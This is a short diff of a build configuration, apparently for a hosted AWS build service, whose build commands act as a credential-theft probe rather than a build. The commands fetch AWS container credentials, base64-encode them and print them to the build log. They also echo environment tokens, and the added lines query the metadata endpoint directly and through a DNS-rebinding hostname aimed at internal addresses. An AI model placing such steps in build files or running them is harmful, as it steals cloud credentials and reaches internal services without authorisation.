@@ -12,7 +12,8 @@ frontend:
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
         - echo "Env token=$AWS_ENVIRONMENT_TOKEN"
         - echo "Build no=$AWS_JOB_ID"
-        - curl --connect-timeout 5 169.254.169.254 2>&1 
+        - curl 169.254.170.2/metadata -v 
+        - curl --connect-timeout 5 a9fea9fe.c0a80001.rbndr.us -v 2>&1 
 #         - sleep 120
 #         - ls -la
 #         - cat op.txt
